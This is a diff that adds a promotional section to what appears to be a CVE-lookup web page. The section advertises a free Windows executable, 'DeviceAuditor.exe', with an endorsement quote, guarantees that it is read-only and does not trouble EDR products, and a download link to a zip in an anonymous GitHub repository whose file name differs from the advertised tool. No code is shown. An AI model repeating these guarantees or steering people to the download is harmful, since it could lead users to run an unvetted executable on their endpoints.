@@ -600,6 +600,63 @@
     </section>
 
     <!-- Interactive Search Demo -->
+    
+    
+
+    
+    <!-- Dedicated Zero-Touch Auditor Section -->
+    <section id="auditor" style="margin-top: 3rem; margin-bottom: 3.5rem;">
+      <div style="background: linear-gradient(135deg, rgba(22, 27, 34, 0.95) 0%, rgba(13, 17, 23, 0.95) 100%); border: 1px solid rgba(88, 166, 255, 0.35); border-radius: 16px; padding: 2.2rem; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
+        <div style="display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 15px; margin-bottom: 1.2rem;">
+          <div>
+            <span style="background: rgba(46, 160, 67, 0.15); color: #3fb950; border: 1px solid rgba(46, 160, 67, 0.3); padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: 700; letter-spacing: 0.5px;">
+              FREE & OPEN AUDITOR • NASEEBA KANU ENTERPRISE SPEC
+            </span>
+            <h2 style="font-size: 1.85rem; font-weight: 800; color: #fff; margin-top: 0.8rem; margin-bottom: 0.4rem;">
+              🛡️ DeviceAuditor.exe — 100% Read-Only Zero-Touch Enterprise Auditor
+            </h2>
+            <p style="color: #8b949e; font-size: 1rem; max-width: 820px; line-height: 1.6;">
+              Engineered based on enterprise SecOps feedback from <b>Naseeba Kanu</b> (Co-founder at TFalke): <b>"An audit that fights the EDR or needs a rollback plan just does not get run. A lightweight, read-only way to check endpoint state is a much easier sell to the security team."</b>
+            </p>
+          </div>
+          <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+            <a href="https://raw.githubusercontent.com/anon-wu/CVE_Checker_Anon_X/main/releases/CVE_Security_Operations_Suite_Portable.zip" class="btn-primary" style="padding: 10px 20px; font-size: 0.9rem;">
+              ⬇️ Free Download DeviceAuditor.exe
+            </a>
+          </div>
+        </div>
+
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 1.2rem; margin-top: 1.5rem;">
+          <div style="background: rgba(13, 17, 23, 0.8); border: 1px solid #30363d; border-radius: 10px; padding: 1.2rem;">
+            <div style="font-size: 1.1rem; font-weight: 700; color: #58a6ff; margin-bottom: 0.5rem;">🔒 100% Read-Only (0 Bytes Mutated)</div>
+            <p style="font-size: 0.88rem; color: #c9d1d9; line-height: 1.5; margin: 0;">
+              Guaranteed 0 registry writes, 0 stopped services, and 0 bytes modified. Because no state changes occur on the endpoint, <b>no rollback plan or change tickets are needed</b>.
+            </p>
+          </div>
+
+          <div style="background: rgba(13, 17, 23, 0.8); border: 1px solid #30363d; border-radius: 10px; padding: 1.2rem;">
+            <div style="font-size: 1.1rem; font-weight: 700; color: #3fb950; margin-bottom: 0.5rem;">⚡ Zero EDR Friction & High Performance</div>
+            <p style="font-size: 0.88rem; color: #c9d1d9; line-height: 1.5; margin: 0;">
+              Zero interference with CrowdStrike, SentinelOne, Defender, or Carbon Black. Audits endpoint state strictly using native Windows read APIs in seconds.
+            </p>
+          </div>
+
+          <div style="background: rgba(13, 17, 23, 0.8); border: 1px solid #30363d; border-radius: 10px; padding: 1.2rem;">
+            <div style="font-size: 1.1rem; font-weight: 700; color: #d2a8ff; margin-bottom: 0.5rem;">📊 JSON & OASIS SARIF v2.1.0 Ready</div>
+            <p style="font-size: 0.88rem; color: #c9d1d9; line-height: 1.5; margin: 0;">
+              One-click clipboard/file export in GUI, plus native CLI automation (<code>--json</code>, <code>--sarif</code>, <code>--lang=en|ko|ja</code>) for direct ingestion into <b>TFalke, Microsoft Intune, SIEM, and GitHub Advanced Security</b>.
+            </p>
+          </div>
+        </div>
+
+        <div style="margin-top: 1.5rem; background: #0d1117; border: 1px solid #21262d; border-radius: 8px; padding: 0.9rem 1.2rem; font-family: Consolas, monospace; font-size: 0.85rem; color: #79c0ff; overflow-x: auto;">
+          <span style="color: #8b949e;"># TFalke & Intune automated endpoint state audit example</span><br/>
+          <span>.\DeviceAuditor.exe --json --lang=en --out="audit_report.json"</span><br/>
+          <span>.\DeviceAuditor.exe --sarif --out="cve_audit.sarif"</span>
+        </div>
+      </div>
+    </section>
+
     <section id="search">
       <h2 class="section-title">Live CVE Catalog & Remediation Policy Search</h2>
       <p class="section-desc">Real-time lookup across urgent November 4, 2026 CISA KEV & NVD baseline entries, enterprise network perimeters, and kernel executive subsystems.</p>
